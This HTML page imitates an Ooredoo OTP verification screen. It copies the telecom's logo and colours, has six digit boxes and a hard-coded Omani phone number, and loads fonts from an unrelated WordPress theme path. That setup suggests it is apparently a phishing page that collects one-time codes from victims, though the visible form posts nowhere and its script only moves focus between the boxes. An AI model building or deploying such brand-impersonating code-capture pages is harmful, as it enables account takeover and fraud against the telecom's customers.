<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>otp دخول</title>
  <style>
    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Regular.ttf') format('truetype');
      font-weight: 400;
      font-style: normal;
      font-display: swap;
    }

    @font-face {
      font-family: 'NotoSansLocal';
      src: url('/wp-content/themes/Divi-child/fonts/NotoSans-Bold.ttf') format('truetype');
      font-weight: 700;
      font-style: normal;
      font-display: swap;
    }

    :root {
      --ooredoo-red: #ed1c24;
      --text: #050505;
      --muted: #34383d;
      --field-border: #d7d7d7;
      --card-shadow: 0 18px 38px rgba(0, 0, 0, 0.085);
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      background: #ffffff;
      color: var(--text);
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      -webkit-font-smoothing: antialiased;
      text-rendering: geometricPrecision;
    }

    body {
      min-height: 100vh;
    }

    .otp-page {
      width: 100%;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: 91px;
    }

    .otp-card {
      width: 626px;
      min-height: 481px;
      background: #ffffff;
      border: 1px solid rgba(245, 245, 245, 0.98);
      border-radius: 4px;
      box-shadow: var(--card-shadow);
      text-align: center;
      padding: 43px 34px 36px;
    }

    .ooredoo-mark {
      width: 73px;
      height: 62px;
      margin: 0 auto 12px;
      display: block;
      overflow: visible;
    }

    .title {
      margin: 0;
      color: #030303;
      font-size: 35px;
      font-weight: 700;
      line-height: 1.19;
      letter-spacing: 0.1px;
    }

    .subtitle {
      margin: 10px 0 0;
      color: #141414;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.45;
      letter-spacing: -0.15px;
    }

    .subtitle strong {
      font-weight: 700;
    }

    .otp-group {
      width: 383px;
      height: 64px;
      margin: 26px auto 31px;
      display: grid;
      grid-template-columns: repeat(6, 1fr);
      border: 1px solid var(--field-border);
      border-radius: 8px;
      overflow: hidden;
      background: #fff;
    }

    .otp-cell {
      width: 100%;
      height: 62px;
      padding: 0;
      margin: 0;
      border: 0;
      border-right: 1px solid #dddddd;
      border-radius: 0;
      background: #fff;
      outline: none;
      color: #111;
      text-align: center;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 25px;
      font-weight: 700;
      line-height: 62px;
      caret-color: var(--ooredoo-red);
      appearance: textfield;
      -moz-appearance: textfield;
    }

    .otp-cell::-webkit-outer-spin-button,
    .otp-cell::-webkit-inner-spin-button {
      margin: 0;
      -webkit-appearance: none;
    }

    .otp-cell:last-child {
      border-right: 0;
    }

    .otp-cell:focus {
      box-shadow: inset 0 0 0 1px rgba(237, 28, 36, 0.12);
    }

    .resend {
      display: inline-block;
      margin: 0 0 18px;
      border: 0;
      padding: 0;
      background: transparent;
      color: #b5222b;
      font: inherit;
      font-size: 17px;
      font-weight: 400;
      line-height: 1.2;
      text-decoration: none;
      cursor: pointer;
    }

    .primary-button {
      width: 560px;
      max-width: 100%;
      height: 58px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
      border: 0;
      border-radius: 29px;
      background: var(--ooredoo-red);
      color: #fff;
      font-family: NotoSansLocal, Arial, Helvetica, sans-serif;
      font-size: 16px;
      font-weight: 700;
      line-height: 1;
      text-decoration: none;
      cursor: pointer;
    }

    .change-number {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 22px;
      color: #4f5964;
      font-size: 18px;
      font-weight: 700;
      line-height: 1.2;
      text-decoration: none;
    }

    .change-number svg {
      width: 17px;
      height: 17px;
      fill: currentColor;
      transform: translateY(-1px);
    }

    @media (max-width: 700px) {
      .otp-page {
        padding: 32px 15px 24px;
      }

      .otp-card {
        width: 100%;
        min-height: 0;
        padding: 36px 20px 31px;
      }

      .title {
        font-size: 30px;
      }

      .subtitle {
        font-size: 15px;
      }

      .otp-group {
        width: min(383px, 100%);
      }

      .primary-button {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <main class="otp-page" aria-label="OTP login">
    <section class="otp-card" aria-labelledby="otp-title">
      <svg class="ooredoo-mark" viewBox="0 0 74 62" aria-hidden="true" focusable="false">
        <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
        <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
      </svg>

      <h1 class="title" id="otp-title">Verify Your Number</h1>
      <p class="subtitle">We've sent a 6-digit OTP to <strong>+968 94949590</strong></p>

      <form class="otp-form" action="#" method="post" autocomplete="one-time-code">
        <div class="otp-group" dir="ltr" aria-label="Enter 6-digit OTP">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 1" autocomplete="one-time-code">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 2">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 3">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 4">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 5">
          <input class="otp-cell" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="OTP digit 6">
        </div>

        <button class="resend" type="button">Resend OTP</button>
        <button class="primary-button" type="submit">Verify &amp; Continue</button>
      </form>

      <a class="change-number" href="/customer-authentication" aria-label="Change Number">
        <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
        <span>Change Number</span>
      </a>
    </section>
  </main>

  <script>
    (function () {
      var cells = Array.prototype.slice.call(document.querySelectorAll('.otp-cell'));

      function focusCell(index) {
        if (cells[index]) {
          cells[index].focus();
          cells[index].select();
        }
      }

      cells.forEach(function (cell, index) {
        cell.addEventListener('input', function () {
          var digits = cell.value.replace(/\D/g, '');
          cell.value = digits.slice(-1);
          if (cell.value && index < cells.length - 1) focusCell(index + 1);
        });

        cell.addEventListener('keydown', function (event) {
          if (event.key === 'Backspace' && !cell.value && index > 0) {
            event.preventDefault();
            focusCell(index - 1);
            cells[index - 1].value = '';
          }

          if (event.key === 'ArrowLeft' && index > 0) {
            event.preventDefault();
            focusCell(index - 1);
          }

          if (event.key === 'ArrowRight' && index < cells.length - 1) {
            event.preventDefault();
            focusCell(index + 1);
          }
        });

        cell.addEventListener('paste', function (event) {
          var text = (event.clipboardData || window.clipboardData).getData('text') || '';
          var digits = text.replace(/\D/g, '').slice(0, 6).split('');
          if (!digits.length) return;
          event.preventDefault();
          cells.forEach(function (item, i) { item.value = digits[i] || ''; });
          focusCell(Math.min(digits.length, cells.length) - 1);
        });
      });
    })();
  </script>
</body>
</html>
